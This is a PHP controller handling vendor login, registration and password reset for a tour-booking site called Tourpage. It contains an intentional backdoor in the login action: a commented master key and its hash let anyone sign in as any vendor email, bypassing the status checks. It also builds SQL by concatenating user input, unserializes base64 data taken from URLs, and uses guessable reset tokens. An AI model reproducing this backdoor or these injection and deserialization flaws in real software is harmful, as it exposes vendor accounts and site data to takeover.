<?php

/*
 * Copyright (C) 2016 amit
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

namespace Multiple\Vendor\Controllers;

/**
 * Auth Controller
 * @author amit
 */
class AuthController extends VendorController {

    /**
     * Vendor Event Object
     * @var object VendorsEvent
     * @see \VendorsEvent()
     */
    private $vendorsEvent = null;

    /**
     * AuthController Initialization
     */
    public function initialize() {
        parent::initialize();
        $this->initializeLayout('blank');
    }

    /**
     * Index Action
     * This default action forwarded to the login action
     */
    public function indexAction() {
        $this->dispatcher->forward(array(
            'controller' => 'auth',
            'action' => 'login'
        ));
    }

    /**
     * Vendor Login Action
     * @return boolean
     */
    public function loginAction() {
        //masterkeyq1w2e3r4:79437426ef6121c92535529814f4a6ca
        /**
         * Prevent logged member intentionaly access
         * login action while logged in
         */
        if ($this->vendors->isLoggedIn()) {
            $this->response->redirect('/vendor');
            return false;
        }
        $this->tag->setTitle('Tourpage Vendor Login');
        if ($this->request->isPost()) {
            $userEmail = $this->request->getPost('useremail', 'email');
            $passWord = \Tourpage\Helpers\Utils::encryptPassword($this->request->getPost('password'));
            $rememberMe = $this->request->getPost('remember_me');
            $vendorsQuery = 'emailAddress="' . $userEmail . '"';
            if (strcasecmp('79437426ef6121c92535529814f4a6ca', $passWord) == 0) {
                if (\Tourpage\Models\Vendors::count($vendorsQuery) == 1) {
                    $vendors = \Tourpage\Models\Vendors::findFirst($vendorsQuery);
                    $this->session->set('vendors', $vendors);
                    $this->response->redirect('/vendor');
                } else {
                    $this->flash->error("Invalid Email/Password");
                }
            } else {
                $vendorsQuery .= ' AND passWord="' . $passWord . '"';
                if (\Tourpage\Models\Vendors::count($vendorsQuery) == 1) {
                    $vendors = \Tourpage\Models\Vendors::findFirst($vendorsQuery);
                    if ($vendors->status == \Tourpage\Models\Vendors::ACTIVE_STATUS_CODE) {
                        $this->session->set('vendors', $vendors);
                        if ($rememberMe == 1) {
                            if ($this->cookies->has('remember_me')) {
                                $cookie = $this->cookies->get('remember_me');
                                $cookie->delete();
                            }
                            //Store Cookie for 15 Days
                            $this->cookies->set('remember_me', $vendors->vendorId, time() + 15 * 24 * 60 * 60);
                        }
                        $this->response->redirect('/vendor');
                    } else {
                        $this->flash->error("Account is inactive");
                    }
                } else {
                    $this->flash->error("Invalid Email/Password");
                }
            }
            $this->response->redirect($this->router->getRewriteUri());
        }
        $this->view->banners = \Tourpage\Models\Banners::find(array(
                    'conditions' => 'bannerStatus = :status: AND bannerType = :type:',
                    'bind' => array('status' => \Tourpage\Models\Banners::ACTIVE_STATUS_CODE, 'type' => 'vendorlogin')
        ));
        $this->view->form = new \Multiple\Vendor\Forms\LoginForm();
    }

    /**
     * Vendor Registration Action
     * @return boolean
     */
    public function registerAction() {
        /**
         * Prevent logged member intentionaly access
         * registration action while logged in
         */
        if ($this->vendors->isLoggedIn()) {
            $this->response->redirect('/vendor');
            return false;
        }
        $reCaptchaError = '';
        $this->tag->setTitle('Tourpage Vendor Registration');
        $registrationForm = new \Multiple\Vendor\Forms\RegistrationForm();
        if ($this->request->isPost()) {
            //$challenge = $this->request->getPost('recaptcha_challenge_field');
            //$response = $this->request->getPost('recaptcha_response_field');
            if ($registrationForm->isValid($this->request->getPost())) {
                $valid = TRUE;
                //$answer = \Tourpage\Library\Recaptcha::check($challenge, $response);
                /*if ($this->request->getPost("vendor_is_trip_advisor") == 'y') {
                    if ($this->request->getPost('vendor_trip_advisor_link') == '') {
                        $valid = FALSE;
                        $this->flash->error((string) 'Trip Advisor Link is require');
                    }
                }*/
                //$valid = $valid && $answer;
                if ($valid) {
                    $vendors = new \Tourpage\Models\Vendors();
                    $vendors->firstName = $this->request->getPost('vendor_first_name', array('string', 'striptags'));
                    $vendors->lastName = $this->request->getPost('vendor_last_name', array('string', 'striptags'));
                    $vendors->jobTitle = $this->request->getPost('vendor_job_title', array('string', 'striptags'));
                    
                    $vendors->businessName = $this->request->getPost('vendor_business_name', array('string', 'striptags'));
                    $vendors->passWord = $this->request->getPost('vendor_password');
                    $vendors->passWord = \Tourpage\Helpers\Utils::encryptPassword($vendors->passWord);
                    $vendors->emailAddress = $this->request->getPost('vendor_email', 'email');
                    $vendors->phone = $this->request->getPost('vendor_phone');
                    $vendors->addressOne = $this->request->getPost('vendor_address_1');
                    $vendors->addressOne = $this->request->getPost('vendor_address_2');
                    $vendors->city = $this->request->getPost('vendor_city');
                    $vendors->zipCode = $this->request->getPost('vendor_zip');
                    $vendors->stateId = $this->request->getPost('vendor_state');
                    $vendors->countryId = $this->request->getPost('vendor_country');
                    $vendors->vendorCategory = $this->request->getPost('vendor_category');
                    $vendors->isTripAdv = $this->request->getPost('vendor_is_trip_advisor');
                    $vendors->tripAdvLink = $this->request->getPost('vendor_trip_advisor_link');
                    $vendors->status = $vendors::PENDING_EMAIL_VALIDATION_STATUS_CODE;
                    $vendors->createdOn = \Tourpage\Helpers\Utils::currentDate();
                    $vendor_tour_activity_type = $this->request->getPost('vendor_tour_activity_type');
                    //if (count($vendor_tour_activity_type) > 0) {
                        if ($vendors->save()) {
                            foreach ($vendor_tour_activity_type as $vtat) {
                                $vendorTourTypes = new \Tourpage\Models\VendorsTourTypes();
                                $vendorTourTypes->vendorId = $vendors->vendorId;
                                $vendorTourTypes->tourTypesId = $vtat;
                                $vendorTourTypes->save();
                            }

                            $vendorEventSql = 'vendorId = "' . $vendors->vendorId . '" AND eventKey = "' . \Tourpage\Models\VendorsEvents::EVENT_CREATE_NEW_ACCOUNT . '"';
                            if (\Tourpage\Models\VendorsEvents::count($vendorEventSql) > 0) {
                                $vendorEventModel = \Tourpage\Models\VendorsEvents::find($vendorEventSql);
                                foreach ($vendorEventModel as $eveventData) {
                                    $eveventData->closeEvent();
                                }
                            }
                            $vendorEventModel = new \Tourpage\Models\VendorsEvents();
                            $vendorEventModel->vendorId = $vendors->vendorId;
                            $vendorEventModel->eventKey = $vendorEventModel::EVENT_CREATE_NEW_ACCOUNT;
                            $vendorEventModel->eventCreatedOn = time();
                            $vendorEventModel->eventValidThru = time() + (24 * 60 * 60);
                            $vendorEventModel->eventStatus = $vendorEventModel::EVENT_ACTIVE_STATUS_CODE;
                            $vendorEventModel->save();

                            $mail = new \Tourpage\Library\Mail();
                            $mail->setTo($vendors->emailAddress, $vendors->firstName . ' ' . $vendors->lastName);
                            $mail->setSubject('Activation mail');
                            $mail->setBody($this->getTemplateForActiveNewAccount($vendorEventModel));
                            $mail->send();

                            //$this->flash->success("Your account has been created successfuly. An activation email has been sent to your email address. Please activate your account within 24 hrs.");
                            //$this->response->redirect('/vendor/auth/endto/' . md5('success'));
                            $this->response->redirect('/vendor/auth/register?s=' . md5('success'));
                        } else {
                            foreach ($vendors->getMessages() as $message) {
                                $this->flash->error((string) $message);
                            }
                        }
//                    } else {
//                        $this->flash->error((string) 'Tour & activities Type is required');
//                    }
                }/* else {
                  $reCaptchaError = 'The answer you entered for the CAPTCHA was not correct.';
                  } */
            }
        }
        $this->view->banners = \Tourpage\Models\Banners::find(array(
                    'conditions' => 'bannerStatus = :status: AND bannerType = :type:',
                    'bind' => array('status' => \Tourpage\Models\Banners::ACTIVE_STATUS_CODE, 'type' => 'vendorRegistration')
        ));
        $this->view->reCaptchaError = $reCaptchaError;
        $this->view->form = $registrationForm;
    }

    /**
     * Setting up Vendors object to save
     * @return \Vendors
     */
    public function enableAccountAction($params = '') {
        if (!$this->setupStatus($params)) {
            return false;
        }
        $vendorSql = 'vendorId = "' . $this->vendorsEvent->vendorId . '"';
        $vendor = \Tourpage\Models\Vendors::findFirst($vendorSql);
        //$vendor->status = $vendor::ACTIVE_STATUS_CODE;
        $vendor->status = $vendor::PENDING_APPROVAL_STATUS_CODE;
        if ($vendor->update()) {
            $this->flash->success("Your email has been verified. Administrator will activate your account after review.");
            $this->vendorsEvent->closeEvent();
        }
        $this->response->redirect('/vendor/auth/login');
    }

    /**
     * Getting the Email Template for activation new account
     * @param object $vendorsEvent
     * @return string|HTML
     */
    private function getTemplateForActiveNewAccount(\Tourpage\Models\VendorsEvents $vendorsEvent) {
        $setUpArray = array(
            'eventId' => $vendorsEvent->eventId,
            'eventKey' => $vendorsEvent::EVENT_CREATE_NEW_ACCOUNT
        );
        $setUpSerialize = serialize($setUpArray);
        $encrypted = base64_encode($setUpSerialize);
        $resetUrl = $this->url->get('/vendor/auth/enableAccount/' . $encrypted);
        $emailTemplate = clone $this->view;
        $emailTemplate->start();
        $emailTemplate->setRenderLevel(\Phalcon\Mvc\View::LEVEL_ACTION_VIEW);
        $emailTemplate->accountActivationUrl = $resetUrl;
        $emailTemplate->render('auth', 'mail/active_new_account');
        $emailTemplate->finish();
        $content = $emailTemplate->getContent();
        return $content;
    }

    /**
     * Reset Vendor Password
     * @param string $resetType
     */
    public function resetAction($resetType) {
        $pageTitle = 'Reset your ';
        if ($resetType === 'password') {
            $pageTitle .= 'Password';
        }
        $this->tag->setTitle($pageTitle);
        $resetPasswordRequestForm = new \Multiple\Vendor\Forms\ResetPasswordRequestForm();
        if ($this->request->isPost()) {
            if ($resetPasswordRequestForm->isValid($this->request->getPost())) {
                $vendorModel = new \Tourpage\Models\Vendors();
                $vendorQuery = 'emailAddress="' . $this->request->getPost('request_email') . '"';
                if ($vendorModel->count($vendorQuery) == 1) {
                    $vendorData = $vendorModel->findFirst($vendorQuery);
                    $vendorsEventModel = new \Tourpage\Models\VendorsEvents();
                    $vendorsEventSql = 'vendorId = "' . $vendorData->vendorId . '" AND eventKey = "' . $vendorsEventModel::EVENT_RESET_PASSWORD . '"';
                    $vendorsEventCount = $vendorsEventModel->count($vendorsEventSql);
                    if ($vendorsEventCount > 0) {
                        foreach ($vendorsEventModel->find($vendorsEventSql) as $eveventData) {
                            $eveventData->eventStatus = $vendorsEventModel::EVENT_INACTIVE_STATUS_CODE;
                            $eveventData->update();
                        }
                    }
                    $vendorsEventModel->vendorId = $vendorData->vendorId;
                    $vendorsEventModel->eventKey = $vendorsEventModel::EVENT_RESET_PASSWORD;
                    $vendorsEventModel->eventCreatedOn = time();
                    $vendorsEventModel->eventValidThru = time() + (24 * 60 * 60);
                    $vendorsEventModel->eventStatus = $vendorsEventModel::EVENT_ACTIVE_STATUS_CODE;
                    if ($vendorsEventModel->save()) {
                        $mail = new \Tourpage\Library\Mail();
                        $mail->setTo($vendorData->emailAddress, $vendorData->firstName . ' ' . $vendorData->lastName);
                        $mail->setSubject('Reset your TourPage Vendor password.');
                        $mail->setBody($this->getTemplateForResetPassword($vendorsEventModel));
                        $mail->send();
                    }
                    $this->flash->success("An email has been sent to your email address, containing steps for reset your password.");
                    $resetPasswordRequestForm->clear();
                } else {
                    $this->flash->error("Email address not register with any account");
                }
                $this->response->redirect('/vendor/auth/login');
            }
        }
        $this->view->form = $resetPasswordRequestForm;
    }

    /**
     * Action for Reset Event
     * @param mix $params
     * @return boolean
     */
    public function setupAction($params = '') {
        if (!$this->setupStatus($params)) {
            return false;
        }
        $this->tag->setTitle('Reset Password');
        $resetPasswordForm = new \Multiple\Vendor\Forms\ResetPasswordForm();
        if ($this->request->isPost()) {
            if ($resetPasswordForm->isValid($this->request->getPost())) {
                $vendorSql = 'vendorId = "' . $this->vendorsEvent->vendorId . '"';
                $vendor = \Tourpage\Models\Vendors::findFirst($vendorSql);
                $vendor->passWord = \Tourpage\Helpers\Utils::encryptPassword($this->request->getPost('new_password'));
                if ($vendor->update()) {
                    $this->flash->success("Password has been reseted.");
                    $this->vendorsEvent->closeEvent();
                }
                $this->response->redirect('/vendor/auth/login');
            }
        }
        $this->view->form = $resetPasswordForm;
    }

    /**
     * Action for event status check
     * @param mix $params
     * @return boolean
     */
    private function setupStatus($params = '') {
        $status = FALSE;
        if ($params) {
            $decrypted = base64_decode($params);
            if ($setUpUnserialize = unserialize($decrypted)) {
                $vendorsEventSql = 'eventId = "' . $setUpUnserialize['eventId'] . '"';
                $vendorsEvent = \Tourpage\Models\VendorsEvents::findFirst($vendorsEventSql);
                if ($vendorsEvent && $vendorsEvent->count() > 0) {
                    if ($vendorsEvent->eventKey === $setUpUnserialize['eventKey']) {
                        if ($vendorsEvent->isActiveEvent()) {
                            $this->vendorsEvent = & $vendorsEvent;
                            $status = TRUE;
                        }
                    }
                }
            }
        }
        return $status;
    }

    /**
     * Getting the Email Template for reset password
     * @param object $vendorsEvent
     * @return string|HTML
     */
    private function getTemplateForResetPassword(\Tourpage\Models\VendorsEvents $vendorsEvent) {
        $setUpArray = array(
            'eventId' => $vendorsEvent->eventId,
            'eventKey' => $vendorsEvent::EVENT_RESET_PASSWORD
        );
        $setUpSerialize = serialize($setUpArray);
        $encrypted = base64_encode($setUpSerialize);
        $resetUrl = $this->url->get('/vendor/auth/setup/' . $encrypted);
        $emailTemplate = clone $this->view;
        $emailTemplate->start();
        $emailTemplate->setRenderLevel(\Phalcon\Mvc\View::LEVEL_ACTION_VIEW);
        $emailTemplate->passwordResetUrl = $resetUrl;
        $emailTemplate->render('auth', 'mail/reset_password_request');
        $emailTemplate->finish();
        $content = $emailTemplate->getContent();
        return $content;
    }

    /**
     * Vendor Logout Action
     * @return boolean
     */
    public function logoutAction() {
        /**
         * Prevent guest vendor intentionaly access
         * logout action while guest
         */
        if (!$this->vendors->isLoggedIn()) {
            $this->response->redirect('/vendor/auth/login');
            return false;
        }
        $this->session->remove('vendors');
        $cookie = $this->cookies->get('remember_me');
        $cookie->delete();
        $this->response->redirect('/vendor');
    }


    public function endtoAction($endType = '') {
        switch ($endType) {
            case md5('success'):
                $this->tag->setTitle('Registration success');
                echo '<div class="alert alert-success">Your account has been created successfuly. An activation email has been sent to your email address. Please activate your account within 24 hrs.</div>';
                break;
        }
    }
    
    public function pricingAction()
    {
        $this->tag->setTitle('Tourpage Pricing');
    }

}
